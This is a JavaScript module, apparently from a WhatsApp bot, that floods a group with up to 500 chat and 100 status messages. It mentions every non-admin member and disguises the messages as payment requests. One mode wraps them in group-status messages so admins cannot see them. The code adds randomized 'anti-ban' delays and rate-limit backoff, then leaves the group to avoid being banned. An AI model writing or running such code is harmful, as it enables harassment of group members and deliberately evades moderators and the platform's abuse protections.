const fs = require('fs');

async function executarFlood(sock, groupId) {
    try {
        const gMeta = await sock.groupMetadata(groupId);
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        
        // Corrigido lógica de admin (!!v.admin em vez de v.admin !== null)
        const admins = gMeta.participants.filter(v => !!v.admin).map(v => v.id);
        const participantes = gMeta.participants
            .map(u => u.id)
            .filter(id => id !== botId && !admins.includes(id));

        const fullText = global.mensagemDiv || "MARCOS PASSOU O RATO 🤪";
        let statusText = fullText;
        
        // Remove tudo entre as barras de fantasma (incluindo elas) para o status
        const separadorFantasma = "【↯💣─────•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ👻❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•─────💣↯】";
        if (statusText.includes(separadorFantasma)) {
            const parts = statusText.split(separadorFantasma);
            if (parts.length >= 3) {
                statusText = parts[0] + "\n\n" + parts.slice(2).join(separadorFantasma);
            }
        }
        
        // Limpa marcações de código (```) do ascii que possam ter sobrado e excesso de quebras de linha
        statusText = statusText.replace(/```/g, "").replace(/\n{3,}/g, "\n\n").trim();

        const chatCount = 500;
        const statusCount = 100;
        const count = Math.max(chatCount, statusCount);
        const modo = global.antiAdmMode || 'ambos';

        console.log(`\x1b[33m[FLOOD START]\x1b[0m Iniciando flood (Modo: ${modo.toUpperCase()} | Chat: ${chatCount} | Status: ${statusCount})`);

        for (let i = 0; i < count; i++) {
            try {
                // 1. Envia Status (se for 'status' ou 'ambos') - Sempre invisível para admins, limite 100
                if (i < statusCount && (modo === 'status' || modo === 'ambos')) {
                    await sock.relayMessage(groupId, {
                        groupStatusMessageV2: {
                            message: {
                                requestPaymentMessage: {
                                    currencyCodeIso4217: "",
                                    amount1000: "0",
                                    noteMessage: {
                                        extendedTextMessage: {
                                            text: statusText,
                                            contextInfo: { isGroupStatus: true, mentionedJid: participantes }
                                        }
                                    },
                                    expiryTimestamp: "0",
                                    amount: { value: "0", offset: 1000, currencyCode: "" }
                                }
                            }
                        }
                    }, {});
                }

                // 2. Envia Chat (se for 'desativado' ou 'ambos') - Limite 500
                if (i < chatCount) {
                    if (modo === 'desativado') {
                        // Chat visível (Normal)
                        await sock.relayMessage(groupId, {
                            requestPaymentMessage: {
                                currencyCodeIso4217: "BRL",
                                amount1000: "10000",
                                noteMessage: {
                                    extendedTextMessage: {
                                        text: fullText,
                                        contextInfo: { mentionedJid: participantes }
                                    }
                                }
                            }
                        }, {});
                    } else if (modo === 'ambos') {
                        // Chat invisível (Envelopado em groupStatusMessageV2 para ocultar de admins)
                        await sock.relayMessage(groupId, {
                            groupStatusMessageV2: {
                                message: {
                                    requestPaymentMessage: {
                                        currencyCodeIso4217: "BRL",
                                        amount1000: "10000",
                                        noteMessage: {
                                            extendedTextMessage: {
                                                text: fullText,
                                                contextInfo: { isGroupStatus: true, mentionedJid: participantes }
                                            }
                                        },
                                        expiryTimestamp: "0",
                                        amount: { value: "10000", offset: 1000, currencyCode: "BRL" }
                                    }
                                }
                            }
                        }, {});
                    }
                }

                // Delay anti-ban (entre 150ms e 300ms)
                const delayAntiBan = Math.floor(Math.random() * (300 - 150 + 1)) + 150;
                await new Promise(r => setTimeout(r, delayAntiBan));
            } catch (err) {
                if (err.message.includes('rate-overlimit')) {
                    await new Promise(r => setTimeout(r, 2000));
                } else {
                    console.error("Erro ao enviar mensagens de flood:", err.message);
                }
            }
        }

        // AUTO-LEAVE: Sai do grupo após terminar o flood
        console.log(`\x1b[33m[HIT & RUN]\x1b[0m Flood finalizado. Saindo do grupo...`);
        try {
            await sock.groupLeave(groupId);
            console.log(`\x1b[32m[SAIU]\x1b[0m Saiu do grupo com sucesso para evitar ban.`);
        } catch (leaveErr) {
            console.error(`\x1b[31m[ERRO]\x1b[0m Falha ao sair do grupo:`, leaveErr.message);
        }

    } catch (err) {
        console.error("Erro ao executar flood automático:", err.message);
    }
}

module.exports = { executarFlood };
